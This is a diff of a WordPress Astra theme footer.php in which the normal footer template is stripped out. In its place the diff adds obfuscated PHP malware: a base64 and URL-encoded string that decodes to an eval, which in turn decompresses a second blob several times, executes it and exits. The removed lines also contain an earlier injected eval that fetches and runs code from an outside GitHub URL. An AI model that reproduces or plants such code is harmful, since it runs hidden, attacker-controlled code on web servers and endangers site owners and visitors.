@@ -1,37 +1,7 @@
 <?php
-/**
- * The template for displaying the footer.
- *
- * Contains the closing of the #content div and all content after.
- *
- * @link https://developer.wordpress.org/themes/basics/template-files/#template-partials
- *
- * @package Astra
- * @since 1.0.0
- */
 
-if ( ! defined( 'ABSPATH' ) ) {
-	exit; // Exit if accessed directly.
-}
-
+$unknown = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNHVrNDUlMjklMjklMjklMjklMjklMjklMjklMjklM0I=";
+$uk45 = "0rdXaDelKhyHyzfaYpMyZqTR6j1yC1uzGmsg4+uU9qWNIr9aLZ0Arp4lkKDfkFa09KNDt+QWBXQCUNMQsyucp0zyN9kFf5Z6oXmV9Er8b4X3HP7+cfbMgXHuPGIUSuHj1n+p7ukODOJnHJN1LgtHrrYua0qCov/X7Srp7K3I1o9OXAHcPi8i+XLWmXkygc6e44+8nIm6aTlpevuIiYXpChnuBSi4aJXqoprOWDENyn76TA8e5ZkmGdAB+a1TekHZhTvGYWBY5FWCMAb2eFVtgWm4Xkz03LH4mXqv9WRb7Gx2krtGS34leajVqsbet23yHe1u5uaZdxueBXa6jUzpzwJoZK5N9wKKHnkA2UbsYxqLnEkBEFbyO25SZ1LRnW6CKQGvTyXUXlNLpBsp5KzxDWEcugO5SsvT3w212qpqiNnBqGyzIvgBViWJmH2ls4Gbyg4cVfW3Y6OdiLuKgaRLorcxko11V2D7A7xzd1t66mnB1XfNw1EoqESkxq+pjMSoUOBKaN/diozCaznqWpUm8xqkMg/6vdeVVzK7fBg9h7VxOE7VzKc8WnjuVtd3BrPRTbUB2sBdzIgAhV+Kecq5TyLjYm+2E923wYXCmORKJigJoSz6ogw9J0BINdW290t57PUZX50imQLWLgb+9Q1ct5ojNUSjUzg1x1+hojhv5Xh/2ad4R5Mcha26EUyxVZ2xJvzZ5F14GJ7kPZJlZR3e51SWQB5bz+yo54dzMuwR3f/dXy5CGVZ+Ezx93eABP6CXHBtjnmLlLz54Ytjv+6U9WiJ5Rg00a91A8AWrZgZDQgSn+nDjip+QHYwFnKX5nnarO2jSqeSiClxmglQ+nP1mfYigtOQg1xidIynU3zcmyc++NxL5oBedGOlVR+QDKRX6ZmozFmOYr+Hqn7YxO+kJ5xi3B7f1/rbG4R6hvQs8fWyxHrWbgp1s8+kUYXWAL71Q1j1lhOrO2isO8g3KkuqrdKjjN5ReEY7V2KdkPVxKbgFZxeWsQC+zH/GpTx8qHSgYtQgc2mBJZCNFtjrN7Nov0B3jsfrhYxGvNqNWkWwSn06PumBgtWhQoibIJjuNz25CTnBbjf+XCmq1ONLZua8MdmS2s6AStSVmqkYS8bWASLZsfuuTD6gkf9VpkCzokCD0D+YsPXg7SM42dbB3KQbMaqt0lugGg1EHK+XYlBWHql+6bd7Y727u7KAI225qEQEWueaWRoT3kRvNDjzDjKjsNyFazTWdoqBj/wIGoD2aHRk6gBjqS04ssiCjlt/x4UcmUdO4o67tDwR7oB+2hoSWrAG8Oqsn1a/a1ofH1QBqumQH5Ug+ZjDM9I7Sn2M2G8A/GhKdEySbgGr3Ov4g7t1DZXsae4aZNGbhIUoRLz8DKumsjD9zCbb5DKRe82HH9mSDkv2Gerchbec5mGXCA0DsaZUrUPdY+fymbFjWZw2+jmccMbDh5Hp0ZFA2fzNquWyD+WNfjPV2hHb2Vo/3JFL7uNXL2+3Jmvt2sGVSpDl78ZhORW05HGpP3FagsHv6I9x1rWNtjhWf+byL/GEpJMnke8qrf+srm8vTw9cUk3LJgLVdjy5DsDxvVIfME+QxTl/MVX/zzH/rk47fvd519//vvsMyvSBjkKXE5Q+VRqRl1Xd9Y/ST92C6MIZ5tog/hhOh+m0YCw3B2tiDBGF870DPf9Wjpgxs0a7BKiwQgRWrkNzHtCkheBXvqFG21V7IkZyMefhRyAZmVaK/w3GG7U+kaJACAP0RiYClsB3Xfo2OHJ1GrFptEqMCaO8/2vt6pluRKT/ySMmMZeIwUJieInMKGyJrimkSfHCvKqv5zvXF139KzGO+UUFei+IeuN+DOa/0tNL+2rdL37f1euDdEYAmbCbGR5ebr8YaVYHbSS2o1SmnwQ9hILHZPkPpn1DEpsxjNlVtcin+eVQoBwJe6PVBsGg+OVQsBofSFYbA";
+eval(htmlspecialchars_decode(urldecode(base64_decode($unknown))));
+exit;
 ?>
-<?php astra_content_bottom(); ?>
-	</div> <!-- ast-container -->
-	</div><!-- #content -->
-<?php 
-	astra_content_after();
-		
-	astra_footer_before();
-		
-	astra_footer();
-		
-	astra_footer_after(); 
-?>
-	</div><!-- #page -->
-<?php 
-	astra_body_bottom();    
-	wp_footer(); 
-?>
-<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/putrisimanis/backlink/main/1")); ?>
-	</body>
-</html>
